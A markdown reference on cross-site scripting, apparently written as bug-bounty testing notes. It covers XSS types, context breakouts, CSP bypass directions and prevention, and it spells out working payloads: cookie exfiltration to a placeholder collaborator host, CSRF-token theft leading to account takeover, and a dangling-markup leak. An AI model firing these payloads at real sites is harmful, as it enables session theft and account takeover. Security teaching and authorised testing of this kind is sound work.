# XSS — Comprehensive Reference

Cross-site scripting executes attacker-controlled JavaScript in a victim's browser within the **target's origin**, defeating the same-origin policy. Anything the user can do or see, the script can do or see.

Sources:
- https://portswigger.net/web-security/cross-site-scripting
- https://portswigger.net/web-security/cross-site-scripting/reflected
- https://portswigger.net/web-security/cross-site-scripting/stored
- https://portswigger.net/web-security/cross-site-scripting/dom-based
- https://portswigger.net/web-security/cross-site-scripting/contexts
- https://portswigger.net/web-security/cross-site-scripting/exploiting
- https://portswigger.net/web-security/cross-site-scripting/content-security-policy
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

---

## 1. The three types

### Reflected XSS
Input arrives in an HTTP request and is included **unsafely in the immediate response**. Example: a `search` parameter echoed into the page. The payload is not stored; it lives in the request, so the attack needs **external delivery** (a crafted link the victim clicks, sent via email/chat/site). Severity is generally lower than stored because of the delivery dependency.

- Entry points: every URL/query param, path segment, body field, and request headers (`Referer`, `User-Agent`, `X-Forwarded-Host`, custom headers, sometimes `Cookie`).
- Test: submit a unique alphanumeric probe per param, find the reflection(s), identify context, breakout.
- **Reflected vs self-XSS:** self-XSS needs the victim to submit the payload themselves (e.g. paste into a field only they control) — low/no impact and undeliverable.

### Stored (persistent / second-order) XSS
Input is **saved server-side** and served in later responses to other users. The attack is **self-contained** — no social engineering — and hits every viewer, which is why it is the highest-signal class, especially when the rendered audience includes privileged users.

- Typical locations: blog/article comments, feedback, user profile fields, display name / username, bio, forum posts, chat/messages, support tickets, filenames, log/audit viewers, admin dashboards rendering user data.
- Out-of-band entry: data that enters via email, third-party feeds, or APIs and is later rendered.
- Test: map each **entry point** to every **exit point** where it is rendered (the exit may be a different page/role than where you entered it — "second order"). Submit a probe, confirm persistence + rendering context, then breakout.

### DOM-based XSS
Client-side JS reads an attacker-controllable **source** and passes it to a **sink** that creates HTML or executes code — often with no server involvement, so it may not appear in the HTTP response at all (inspect the live DOM).

**Common sources** (attacker-controllable):
`location` (`location.href`, `location.search`, `location.hash`, `location.pathname`), `document.URL`, `document.documentURI`, `document.baseURI`, `document.referrer`, `window.name`, `document.cookie`, `history.pushState`/`replaceState` args, and `postMessage` `event.data`.

**Common sinks:**
- *Direct code execution:* `eval()`, `Function()`, `setTimeout(str)`, `setInterval(str)`, `element.onevent = ...`.
- *HTML injection:* `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write()`, `document.writeln()`, `element.srcdoc`, `DOMParser`/`Range.createContextualFragment`.
- *Navigation/URL:* `location` / `location.href` assignment, `element.src`/`href` set to `javascript:`, `window.open`.
- *jQuery:* `$(sink)`, `.html()`, `.append()`/`.prepend()`/`.before()`/`.after()`, `.attr('href'|'src', ...)`, `$.parseHTML()`, the `$()` selector with attacker input.

**Testing:** put a probe in the source (e.g. `#wkr7q9z`), inspect the DOM (devtools Ctrl+F), and for code sinks use the debugger / source search (Ctrl+Shift+F) to trace source → variable → sink. Burp **DOM Invader** automates this. Note: `innerHTML` will **not** run a raw `<script>`; use `<img onerror>`/`<svg onload>`.

---

## 2. Contexts and breakouts

Determine which of `' " < > / \ ` ${}` survive un-encoded; that decides the breakout.

### Between HTML tags
Inject a new element that runs JS without interaction:
```
<script>alert(document.domain)</script>
<svg onload=alert(document.domain)>
<img src=x onerror=alert(document.domain)>
```
If the tag name is blocked, try less-common tags / custom elements with events (see cheatsheet).

### In an HTML tag attribute value
- Brackets allowed → break out of the tag: `"><svg onload=alert(document.domain)>`
- Brackets blocked → stay inside the tag and add an auto-firing handler:
  `" autofocus onfocus=alert(document.domain) x="`
- The value is a URL attribute (`href`, `src`, `formaction`, `data` of object, `action`): `javascript:alert(document.domain)`
- Quoteless attributes: a space or `/` ends the value; you may inject an event handler without breaking a quote.

### In a JavaScript string (inside `<script>`)
```
'-alert(document.domain)-'
';alert(document.domain)//
"-alert(document.domain)-"
```
- If quotes are **backslash-escaped** by the app (`\'`), send a backslash first so the app's added backslash is itself escaped: input `\` → `\\` neutralizes, then `';alert(1)//`.
- Angle-bracket route (HTML parser wins over JS): `</script><svg onload=alert(document.domain)>`.
- Character-restricted? Use `onerror=alert;throw 1` style, or build strings from `String.fromCharCode`/template literals.

### In a JavaScript template literal (backticks)
Expressions execute without closing the literal:
```
${alert(document.domain)}
```

### In a URL / `href` context
`javascript:` pseudo-protocol in any navigable URL sink:
```
javascript:alert(document.domain)
```
Useful in `<a href>`, `<iframe src>`, jQuery `.attr('href', userInput)`, framework router `returnUrl`/`redirect` params.

### HTML-encoding workaround
In some JS-string-in-HTML contexts the browser HTML-decodes before the JS parser runs, so `&apos;`/`&quot;`/`&#39;` can smuggle quotes the server filter missed: `&apos;-alert(document.domain)-&apos;`.

### Client-side template injection
Apps using AngularJS (`ng-app` present) or Vue evaluate `{{ }}`/expressions in user data. Inject template expressions and (for older AngularJS) sandbox-escape gadgets — see cheatsheet. CSP often does **not** stop these because they use the framework's own already-allowed code.

---

## 3. Exploiting XSS for real impact

`alert(document.domain)` proves execution and **which origin** runs the code — that is the fire-proof, not the impact. For a report, demonstrate one concrete impact:

### Session cookie theft (with caveats)
```
new Image().src='https://YOUR-COLLAB/c?='+encodeURIComponent(document.cookie);
```
Caveats that often make this weak/unreliable: `HttpOnly` hides the session cookie from JS; sessions may be IP-bound; the victim may have no active session; short timeouts. If `HttpOnly` is set, say so and pivot to token/action proof below.

### Capturing credentials via password-manager auto-fill
Inject a hidden login form; many password managers auto-fill it; read the values on DOM ready and exfil to **your** collaborator. Effective where cookies are protected, and dangerous if the victim reuses passwords. (Demonstrate with your own test account only.)

### CSRF-token theft → account actions → ATO
The high-signal chain. Because XSS runs in-origin, it can **read** the page (and any anti-CSRF token) and **send** authenticated requests, so CSRF tokens do not protect against it:
```
var t=document.querySelector('input[name="csrf"]').value;
fetch('/account/change-email',{method:'POST',body:'csrf='+t+'&email=attacker@collab',credentials:'include'});
```
Chain: read token → change email/add a 2FA device → trigger reset → take over. This two-way (request + read response) capability is what elevates XSS to account takeover. Prove it against **your own** test account.

### BeEF-style hooking
A long-lived stored XSS can hook the browser (BeEF) for sustained control. For a bounty report, a single proven impactful action is enough — keep PoC minimal and safe.

### Dangling markup injection
When you can inject HTML but not execute script (e.g. CSP blocks JS), inject an unterminated tag that swallows subsequent markup (including a CSRF token) into an attacker URL:
```
<img src='https://YOUR-COLLAB/leak?
```
Everything up to the next `'` is sent to the collaborator. A capture/exfil channel without script execution.

---

## 4. CSP basics and bypass directions

CSP is a browser policy (response header `Content-Security-Policy`) restricting where scripts/resources may load, mitigating XSS even when injection exists.

Key `script-src` mechanisms:
- `'self'` — only same-origin scripts.
- explicit host(s) — only those domains.
- `'nonce-XYZ'` — only `<script nonce="XYZ">`; nonce must be unguessable and fresh per response.
- `'sha256-...'` hash — only scripts matching the hash.
- `'unsafe-inline'` — allows inline JS (defeats most XSS protection — a red flag).
- `'strict-dynamic'` — trusts scripts loaded by already-trusted scripts.

Bypass directions to probe:
- **Permissive sources:** wildcards or a CDN/host that lets you host arbitrary JS (or has a JSONP endpoint) — load your script from an allowed origin.
- **JSONP on an allowed host:** `script-src` allows a domain that exposes a JSONP callback → execute via the callback.
- **Missing directives:** if `object-src`/`base-uri` are absent, abuse `<object>`/`<base>`.
- **Policy injection:** input reflected into the policy (e.g. a `report-uri`/report value) can let you inject `;` and add a directive like `script-src-elem` to weaken it.
- **No-script channels:** when JS is fully blocked, use `img`/dangling-markup for **exfiltration** even though you can't execute.

---

## 5. Prevention (for triage / report remediation advice)
1. **Context-aware output encoding** at every sink: HTML-entity-encode in HTML body; attribute-encode in attributes; JS-string-encode (or better, avoid) in scripts; URL-encode in URLs. Encode for the *output* context, not the input.
2. **Avoid dangerous sinks:** prefer `textContent`/`innerText` over `innerHTML`; never feed user data to `eval`/`document.write`/`setTimeout(str)`; use safe framework bindings, not `dangerouslySetInnerHTML`/`v-html`/`[innerHTML]`.
3. **Input validation** on type/format as defense-in-depth (not a substitute for encoding).
4. **CSP** as a second layer: nonce/hash-based, no `unsafe-inline`.
5. Correct `Content-Type` + `X-Content-Type-Options: nosniff` so reflected JSON/text is never sniffed into HTML.
6. **Cookie flags:** `HttpOnly` (blocks JS cookie theft), `Secure`, `SameSite`.
